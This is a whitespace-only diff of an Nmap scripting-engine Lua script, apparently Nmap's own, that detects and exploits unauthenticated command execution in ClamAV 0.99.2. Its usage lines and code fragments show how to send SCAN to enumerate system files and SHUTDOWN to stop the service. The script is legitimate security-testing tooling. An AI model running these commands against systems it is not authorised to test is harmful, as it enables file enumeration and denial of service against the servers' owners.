@@ -1,5 +1,5 @@
 local shortport = require "shortport"
-local vulns = require "vulns" 
+local vulns = require "vulns"
 local nmap = require "nmap"
 local stdnse = require "stdnse"
 local table = require "table"
@@ -8,14 +8,14 @@ local string = require "string"
 local comm = require "comm"
 
 description = [[
-Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution. 
+Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.
 
-ClamAV server 0.99.2, and possibly other previous versions, allow the execution 
-of dangerous service commands without authentication. Specifically, the command 'SCAN' 
-may be used to list system files and the command 'SHUTDOWN' shut downs the 
+ClamAV server 0.99.2, and possibly other previous versions, allow the execution
+of dangerous service commands without authentication. Specifically, the command 'SCAN'
+may be used to list system files and the command 'SHUTDOWN' shut downs the
 service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
 
-This script without arguments test the availability of the command 'SCAN'. 
+This script without arguments test the availability of the command 'SCAN'.
 
 Reference:
 * https://twitter.com/nitr0usmx/status/740673507684679680
@@ -23,38 +23,38 @@ Reference:
 ]]
 
 ---
--- @usage 
+-- @usage
 -- nmap -sV --script clamav-exec <target>
 -- nmap --script clamav-exec --script-args cmd='scan',scandb='files.txt' <target>
 -- nmap --script clamav-exec --script-args cmd='shutdown' <target>
--- 
+--
 -- @output
 -- PORT     STATE SERVICE VERSION
 -- 3310/tcp open  clam    ClamAV 0.99.2 (21714)
--- | clamav-exec: 
+-- | clamav-exec:
 -- |   VULNERABLE:
 -- |   ClamAV Remote Command Execution
 -- |     State: VULNERABLE
--- |       ClamAV 0.99.2, and possibly other previous versions, allow the execution of the 
--- |       clamav commands SCAN and SHUTDOWN without authentication. The command 'SCAN' 
--- |       may be used to enumerate system files and the command 'SHUTDOWN' shut downs the 
+-- |       ClamAV 0.99.2, and possibly other previous versions, allow the execution of the
+-- |       clamav commands SCAN and SHUTDOWN without authentication. The command 'SCAN'
+-- |       may be used to enumerate system files and the command 'SHUTDOWN' shut downs the
 -- |       service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
--- |       
+-- |
 -- |     Disclosure date: 2016-06-8
 -- |     Extra information:
 -- |       SCAN command is enabled.
 -- |     References:
 -- |       https://bugzilla.clamav.net/show_bug.cgi?id=11585
 -- |_      https://twitter.com/nitr0usmx/status/740673507684679680
--- @xmloutput 
+-- @xmloutput
 -- <table key="NMAP-1">
 -- <elem key="title">ClamAV Remote Command Execution</elem>
 -- <elem key="state">VULNERABLE</elem>
 -- <table key="description">
--- <elem>ClamAV 0.99.2, and possibly other previous versions, allow the execution 
--- of the &#xa;clamav commands SCAN and SHUTDOWN without authentication. 
--- The command &apos;SCAN&apos; &#xa;may be used to enumerate system files and 
--- the command &apos;SHUTDOWN&apos; shut downs the &#xa;service. 
+-- <elem>ClamAV 0.99.2, and possibly other previous versions, allow the execution
+-- of the &#xa;clamav commands SCAN and SHUTDOWN without authentication.
+-- The command &apos;SCAN&apos; &#xa;may be used to enumerate system files and
+-- the command &apos;SHUTDOWN&apos; shut downs the &#xa;service.
 -- This vulnerability was discovered by Alejandro Hernandez (nitr0us).&#xa;</elem>
 -- </table>
 -- <table key="dates">
@@ -75,7 +75,7 @@ Reference:
 -- </table>
 --
 -- @args clamav-exec.cmd Command to execute. Option: scan and shutdown
--- @args clamav-exec.scandb Database to file list. 
+-- @args clamav-exec.scandb Database to file list.
 ---
 
 author = "Paulino Calderon <calderon()websec.mx>"
@@ -112,7 +112,7 @@ local function scan(host, port, file)
       stdnse.debug1("SCAN command enabled.")
       return true, nil
     end
-  else 
+  else
     status, data = comm.exchange(host, port, "SCAN " .. file)
     if not status then
       stdnse.debug1("Failed to send 'SCAN %s' command:%s", file, data)
@@ -164,9 +164,9 @@ action = function(host, port)
     title = 'ClamAV Remote Command Execution',
     state = vulns.STATE.NOT_VULN,
     description = [[
-ClamAV 0.99.2, and possibly other previous versions, allow the execution of the 
-clamav commands SCAN and SHUTDOWN without authentication. The command 'SCAN' 
-may be used to enumerate system files and the command 'SHUTDOWN' shut downs the 
+ClamAV 0.99.2, and possibly other previous versions, allow the execution of the
+clamav commands SCAN and SHUTDOWN without authentication. The command 'SCAN'
+may be used to enumerate system files and the command 'SHUTDOWN' shut downs the
 service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
 ]],
     references = {
@@ -205,10 +205,10 @@ service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).
   elseif cmd == "shutdown" then
     status = shutdown(host, port)
     if status then
-      vuln.extra_info = "SHUTDOWN command sent succesfully."  
+      vuln.extra_info = "SHUTDOWN command sent succesfully."
       vuln.state = vulns.STATE.VULN
     end
-  else 
+  else
     status, files = scan(host, port, nil)
     if status then
       vuln.extra_info = "SCAN command is enabled."
